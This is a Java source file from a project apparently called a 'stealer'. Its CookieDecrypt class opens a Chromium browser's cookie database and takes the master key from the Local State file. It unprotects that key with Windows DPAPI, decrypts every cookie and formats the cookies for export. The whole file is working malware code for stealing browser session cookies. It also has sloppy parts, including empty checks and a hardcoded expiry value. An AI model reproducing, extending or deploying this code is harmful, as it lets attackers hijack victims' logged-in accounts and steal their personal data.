package dev.kazi.stealer.utils.decrypt.cookie;

import dev.kazi.stealer.utils.decrypt.DecryptUtil;
import java.util.Arrays;
import java.util.Base64;

import org.json.JSONObject;
import dev.kazi.stealer.utils.Util;
import com.github.windpapi4j.WinDPAPI;
import java.sql.SQLException;
import java.util.Date;
import java.sql.ResultSet;
import java.sql.Statement;
import java.sql.Connection;
import java.sql.DriverManager;
import java.nio.file.Files;
import java.nio.file.CopyOption;
import java.util.HashSet;
import java.util.ArrayList;
import java.util.List;
import java.io.File;

public class CookieDecrypt {

    private File COOKIE_PATH;
    private File LOCAL_STATE_PATH;
    public List<String> COOKIE_DATA;
    public List<String> COOKIES;
    
    public CookieDecrypt(final String path0, final String path1) {
        this.COOKIE_PATH = null;
        this.LOCAL_STATE_PATH = null;
        this.COOKIE_PATH = new File(path0);
        this.LOCAL_STATE_PATH = new File(path1);
        this.COOKIES = new ArrayList<String>();
        this.COOKIE_DATA = new ArrayList<String>();
    }
    
    public String getData() {
        final StringBuilder temp = new StringBuilder();
        this.COOKIES.forEach(cookie -> temp.append(cookie).append("\n"));
        return temp.toString();
    }
    
    public CookieDecrypt getCookies() {
        final HashSet<Cookie> cookies = new HashSet<Cookie>();
        Connection connection = null;
        File tempFile = null;
        try {
            tempFile = new File(this.COOKIE_PATH.getAbsolutePath());
            Files.copy(this.COOKIE_PATH.toPath(), tempFile.toPath(), new CopyOption[0]);
            connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
            final Statement statement = connection.createStatement();
            statement.setQueryTimeout(30);
            final ResultSet resultSet = statement.executeQuery("SELECT * FROM cookies");
            while (resultSet.next()) {
                final String name = resultSet.getString("name");
                this.parseCookieFromResult(tempFile, name, cookies, resultSet);
            }
        }
        catch (final Exception exception) {
            try {
                if (connection != null) {
                    connection.close();
                }
            }
            catch (final Exception exception2) {
                exception2.printStackTrace();
            }
        }
        return this;
    }
    
    private void parseCookieFromResult(final File cookieStore, final String name, final HashSet<Cookie> cookieSet, final ResultSet resultSet) throws SQLException {
        final byte[] encryptedBytes = resultSet.getBytes("encrypted_value");
        final String path = resultSet.getString("path");
        final String domain = resultSet.getString("host_key");
        final boolean secure = resultSet.getBoolean("is_secure");
        final boolean httpOnly = resultSet.getBoolean("is_httponly");
        final String expires = "1705531916";
        final String key = resultSet.getString(4);
        final String encryptedCookie = this.decrypt(name, encryptedBytes, null, path, domain, secure, httpOnly, cookieStore);
        if (encryptedCookie != null) {
            final String format = domain + "\t" + String.valueOf(secure).toUpperCase() + "\t" + path + "\t" + String.valueOf(httpOnly).toUpperCase() + "\t" + expires + "\t" + key + "\t" + encryptedCookie;
            this.COOKIES.add(format);
        }
    }
    
    private String decrypt(final String name, final byte[] encryptedBytes, final Date expires, final String path, final String domain, final boolean secure, final boolean httpOnly, final File cookieStore) {
        byte[] decryptedBytes = null;
        byte[] encryptedValue = encryptedBytes;
        try {
            final boolean isV10 = new String(encryptedValue).startsWith("v10");
            if (WinDPAPI.isPlatformSupported()) {
                final WinDPAPI winDPAPI = WinDPAPI.newInstance(new WinDPAPI.CryptProtectFlag[] { WinDPAPI.CryptProtectFlag.CRYPTPROTECT_UI_FORBIDDEN });
                if (!isV10) {
                    decryptedBytes = winDPAPI.unprotectData(encryptedValue);
                }
                else {
                    if (!this.LOCAL_STATE_PATH.exists()) {}
                    final String localState = Util.toString(this.LOCAL_STATE_PATH);
                    final JSONObject jsonObject = new JSONObject(localState);
                    final String encryptedKeyBase64 = jsonObject.getJSONObject("os_crypt").getString("encrypted_key");
                    byte[] encryptedKeyBytes = Base64.getDecoder().decode(encryptedKeyBase64);
                    if (!new String(encryptedKeyBytes).startsWith("DPAPI")) {}
                    encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, "DPAPI".length(), encryptedKeyBytes.length);
                    final byte[] keyBytes = winDPAPI.unprotectData(encryptedKeyBytes);
                    if (keyBytes.length != 32) {}
                    final byte[] nonceBytes = Arrays.copyOfRange(encryptedValue, "V10".length(), "V10".length() + 12);
                    encryptedValue = Arrays.copyOfRange(encryptedValue, "V10".length() + 12, encryptedValue.length);
                    decryptedBytes = DecryptUtil.getDecryptBytes(encryptedValue, keyBytes, nonceBytes);
                }
            }
        }
        catch (final Exception e) {
            return null;
        }
        if (decryptedBytes == null) {
            return null;
        }
        return new String(decryptedBytes);
    }
}
